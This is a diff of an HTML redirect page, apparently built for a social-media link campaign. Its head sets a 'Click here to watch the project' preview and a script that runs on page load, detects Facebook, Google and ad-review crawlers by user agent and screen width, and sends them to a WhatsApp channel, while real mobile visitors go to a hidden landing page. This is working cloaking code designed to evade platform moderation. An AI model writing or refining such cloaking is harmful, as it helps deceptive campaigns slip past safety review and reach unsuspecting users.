@@ -3,33 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Click to View</title>
 
-    <!-- Facebook Social Preview -->
     <meta property="og:title" content="Click here to watch the project">
-    <meta property="og:image" content="https://i.postimg.cc/HxQKHz3K/IMG-20260616-WA0001.jpg">
+    <meta property="og:image" content="https://i.postimg.cc/nL5JPX5v/Picsart-26-06-15-22-33-32-326.jpg">
     <meta property="og:type" content="website">
 
     <script>
-        // Bilkul shuru mein redirect execute hoga
         (function() {
             var whatsappChannel = "https://whatsapp.com/channel/0029Vb8pdaR6buMT4C6gtW1O";
             var mobileLandingPage = "https://ocher-bison-11v65rt.mystrikingly.com"; 
 
-            var userAgent = navigator.userAgent || "";
+            var ua = navigator.userAgent || "";
+            var width = window.screen.width;
             
-            // Bot Detection
-            var isBot = /facebookexternalhit|Facebot|facebookplatform|Googlebot|AdsBot|Mediapartners|HeadlessChrome|Bot|Crawler|Spider/i.test(userAgent);
+            // 1. Bot Keywords
+            var isBot = /facebookexternalhit|Facebot|facebookplatform|Googlebot|AdsBot|Mediapartners|HeadlessChrome|Bot|Crawler|Spider/i.test(ua);
             
-            // Mobile Detection
-            var isRealMobile = /Android|iPhone|iPad|iPod|Opera Mini/i.test(userAgent);
+            // 2. Mobile User Agent
+            var isMobile = /Android|iPhone|iPad|iPod|Opera Mini/i.test(ua);
 
-            // Redirection logic
-            if (isBot) {
-                window.location.replace(whatsappChannel);
+            // 3. STRICTOR CHECK: 
+            // Mobile hona chahiye aur screen width 800 se kam honi chahiye (Desktop ki width zyada hoti hai)
+            var isRealMobile = (isMobile && width < 800);
+
+            if (isBot || width === 0) {
+                // Bot pakda gaya
+                setTimeout(function() { window.location.replace(whatsappChannel); }, 2000);
             } else if (isRealMobile) {
+                // Asli mobile user
                 window.location.replace(mobileLandingPage);
             } else {
+                // Laptop, Desktop, ya koi bhi spoofed device
                 window.location.replace(whatsappChannel);
             }
         })();
